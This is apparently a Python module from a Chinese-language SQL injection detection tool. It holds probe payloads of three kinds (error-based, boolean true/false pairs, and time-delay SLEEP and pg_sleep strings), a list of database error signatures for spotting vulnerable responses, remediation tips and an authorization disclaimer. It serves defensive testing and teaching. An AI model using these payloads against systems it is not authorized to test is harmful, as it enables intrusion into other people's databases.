# -*- coding: utf-8 -*-
"""探测载荷与说明。

只包含「判断某个参数是否存在注入点」所需的载荷，**不含**任何用于
拖取数据、枚举库表、提取凭据、绕过 WAF 或批量扫描的内容。
每条载荷都附带原理说明，用于教学和编写修复报告。
"""
from __future__ import annotations

from dataclasses import dataclass


@dataclass(frozen=True)
class Payload:
    value: str
    note: str
    dialect: str = "通用"


@dataclass(frozen=True)
class BooleanPair:
    true_payload: Payload
    false_payload: Payload
    note: str


@dataclass(frozen=True)
class TimePayload:
    value: str
    note: str
    sleep_seconds: float
    dialect: str = "通用"


# ---------- 报错型：观察服务端是否把 SQL 语法错误回显出来 ----------
ERROR_PAYLOADS: tuple[Payload, ...] = (
    Payload("'", "单引号闭合探测：若参数被直接拼进字符串字面量，会破坏引号配对"),
    Payload('"', "双引号闭合探测：覆盖使用双引号包裹字符串的数据库"),
    Payload("\\", "反斜杠转义探测：覆盖依赖反斜杠转义的拼接场景"),
    Payload("1' OR '1'='1", "永真条件探测：观察条件被篡改后结果集是否异常变化"),
    Payload("1' AND 1=1 -- ", "注释符探测：验证行尾注释能否吞掉后续 SQL"),
    Payload("1') AND 1=1 -- ", "括号闭合探测：覆盖带括号包裹的查询"),
    Payload("1' AND 1=CAST('x' AS INT) -- ", "类型转换报错探测：主动触发可被识别的数据库报错"),
)

# ---------- 布尔盲注：对比永真 / 永假两种条件的响应差异 ----------
BOOLEAN_PAIRS: tuple[BooleanPair, ...] = (
    BooleanPair(
        Payload("1' AND '1'='1", "永真条件（字符串上下文）"),
        Payload("1' AND '1'='2", "永假条件（字符串上下文）"),
        "字符串型参数的标准对比组",
    ),
    BooleanPair(
        Payload("1 AND 1=1", "永真条件（数值上下文）"),
        Payload("1 AND 1=2", "永假条件（数值上下文）"),
        "数值型参数的标准对比组",
    ),
    BooleanPair(
        Payload("1' AND 1=1 -- ", "永真条件 + 注释"),
        Payload("1' AND 1=2 -- ", "永假条件 + 注释"),
        "带注释符的对比组",
    ),
    BooleanPair(
        Payload("1) AND 1=1 -- ", "永真条件 + 括号"),
        Payload("1) AND 1=2 -- ", "永假条件 + 括号"),
        "带括号包裹的对比组",
    ),
)

# ---------- 时间盲注：观察条件是否让数据库产生可测量的延迟 ----------
TIME_PAYLOADS: tuple[TimePayload, ...] = (
    TimePayload(
        "1' AND SLEEP(2) -- ",
        "MySQL / SQLite 风格的延时函数",
        2.0,
        "MySQL / SQLite",
    ),
    TimePayload(
        "1' AND pg_sleep(2) IS NULL -- ",
        "PostgreSQL 风格的延时函数",
        2.0,
        "PostgreSQL",
    ),
    TimePayload(
        "1 AND SLEEP(2) -- ",
        "数值上下文的延时探测",
        2.0,
        "MySQL / SQLite",
    ),
)

# 常见数据库报错特征（全部小写）。命中只代表「疑似」，需人工复核。
DB_ERROR_SIGNATURES: tuple[str, ...] = (
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "unterminated quoted string",
    "incorrect syntax near",
    "ora-00933",
    "ora-01756",
    "microsoft ole db provider",
    "odbc driver",
    "unrecognized token",
    "sqlite3.operationalerror",
    "sqlite error",
    "near \"",
    "syntax error at or near",
    "pg_query",
    "invalid input syntax",
    "supplied argument is not a valid mysql",
    "mysql_fetch",
    "pdoexception",
    "syntax error",
    "database error",
)

# 泛化特征命中时只能给出低置信度，避免把普通页面文案误判成注入
GENERIC_SIGNATURES: frozenset[str] = frozenset({"syntax error", "database error"})

DEFENSE_TIPS: tuple[tuple[str, str], ...] = (
    (
        "参数化查询（首选）",
        "使用预编译语句 / 占位符绑定，让用户输入永远作为数据而非 SQL 代码。"
        "例如 Python 用 cursor.execute(sql, (value,))，Java 用 PreparedStatement。",
    ),
    (
        "ORM 与查询构造器",
        "优先走 ORM 的参数绑定接口，避免手工字符串拼接；禁止把用户输入拼进 ORDER BY / 表名 / 列名。",
    ),
    (
        "白名单校验",
        "对枚举值、排序字段、表名等无法参数化的位置，采用严格白名单映射，而不是过滤黑名单。",
    ),
    (
        "最小权限",
        "应用数据库账号只授予必要表的必要权限，禁用文件读写、堆叠多语句与危险扩展。",
    ),
    (
        "关闭详细报错",
        "生产环境统一返回通用错误页，数据库报错只写服务端日志，避免为攻击者提供回显通道。",
    ),
    (
        "纵深防御",
        "WAF 只能作为补充；配合输入长度限制、慢查询监控、异常请求告警与定期代码审计。",
    ),
)

DISCLAIMER_SHORT = (
    "本工具仅用于对本人所有、或已取得所有者书面授权的系统进行安全自检与教学演示。"
    "未经授权对他人系统进行测试可能违反《网络安全法》《刑法》等法律法规，"
    "由此产生的一切后果由使用者自行承担。"
)
